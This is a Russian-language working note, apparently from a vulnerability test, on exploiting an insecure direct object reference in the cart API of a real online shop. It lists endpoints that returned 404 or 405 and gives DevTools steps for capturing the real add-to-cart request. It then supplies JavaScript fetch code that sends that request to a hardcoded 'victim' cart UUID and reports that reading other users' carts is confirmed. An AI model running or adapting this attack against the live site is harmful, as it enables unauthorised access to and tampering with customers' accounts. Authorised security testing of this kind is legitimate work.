# КРИТИЧЕСКИ ВАЖНО: Найти реальные endpoints через Network tab

## Все протестированные endpoints вернули 404/405

Пробовали:
- ✅ `/checkout/api/cart-api/v2/cart/{uuid}/articles` → 404
- ✅ `/checkout/api/cart-api/v2/cart/{uuid}/add` → 404
- ✅ `/checkout/api/cart-api/v2/cart/{uuid}/addArticle` → 404
- ✅ `/api/cart/v2/{uuid}/items` → 404
- ✅ PATCH на основной endpoint → 405
- ✅ Все остальные варианты → 404/405

## ЕДИНСТВЕННЫЙ СПОСОБ: Network tab анализ

### Пошаговая инструкция:

1. **Откройте DevTools** (F12)
2. **Перейдите на вкладку Network**
3. **Очистите запросы** (кнопка Clear или Ctrl+L)
4. **Добавьте фильтр**: введите `cart` или `api` в поле фильтра
5. **ВАЖНО**: Добавьте товар в СВОЮ корзину (Account B) через интерфейс сайта:
   - Перейдите на страницу любого товара
   - Нажмите кнопку "В корзину" / "Add to cart"
   - ИЛИ откройте корзину и измените количество товара
6. **Найдите запрос** который отправляется:
   - Ищите POST/PUT запросы
   - URL должен содержать `cart` или `article`
   - Проверьте Request payload
7. **Скопируйте**:
   - Полный URL endpoint
   - Method (POST/PUT/DELETE)
   - Headers (все заголовки)
   - Request payload (body)

## Что искать в Network tab:

### Фильтры для поиска:
- `cart` - найдет все запросы связанные с корзиной
- `api` - найдет все API запросы
- `POST` - найдет все POST запросы
- `PUT` - найдет все PUT запросы

### Примеры того что может быть:
- `POST /checkout/api/cart-api/v2/cart/{your-cart-uuid}/...`
- `PUT /checkout/api/cart-api/v2/cart/{your-cart-uuid}/...`
- `POST /api/cart/...`
- `POST /semiprotected/api/checkout/...`
- Любые запросы с `article`, `add`, `update`, `remove` в URL

## После нахождения реального endpoint:

### Шаг 1: Скопируйте точный URL и payload
Например, если нашли:
```
POST https://www.zooplus.de/checkout/api/cart-api/v2/cart/YOUR_CART_UUID/some-endpoint
Body: {"offerId": 12345, "quantity": 1}
```

### Шаг 2: Замените YOUR_CART_UUID на UUID корзины Account A
```javascript
const VICTIM_CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
const OFFER_ID = 301337; // или любой другой

// Используйте найденный endpoint с UUID жертвы
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${VICTIM_CART_UUID}/some-endpoint`, {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    // Добавьте все заголовки которые были в оригинальном запросе
  },
  body: JSON.stringify({
    offerId: OFFER_ID,
    quantity: 1
  })
})
.then(r => {
  console.log("Status:", r.status);
  return r.json().then(data => {
    console.log("Response:", data);
    if (r.status === 200 || r.status === 201) {
      console.log("[!!!] SUCCESS! Cart modified!");
    }
  });
})
.then(() => {
  // Проверить корзину
  fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${VICTIM_CART_UUID}`, {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(cart => {
    console.log(`Cart now has ${cart.articles.length} items, total: ${cart.summary.grandTotal} EUR`);
  });
});
```

## Альтернатива: Проверить JavaScript код сайта

Если не можете найти через Network tab, попробуйте:

1. Откройте DevTools → Sources
2. Найдите JavaScript файлы связанные с корзиной
3. Ищите функции `addToCart`, `updateCart`, `removeFromCart`
4. Найдите какие endpoints они вызывают

## Текущий статус:

- ✅ **Чтение корзины**: ПОДТВЕРЖДЕНО (High severity - CVSS 7.1)
- ❌ **Модификация корзины**: НЕ ПОДТВЕРЖДЕНА (все endpoints вернули 404/405)

**Вывод**: Чтение подтверждено и это уже серьезная уязвимость. Для подтверждения модификации нужно найти реальные endpoints через Network tab.

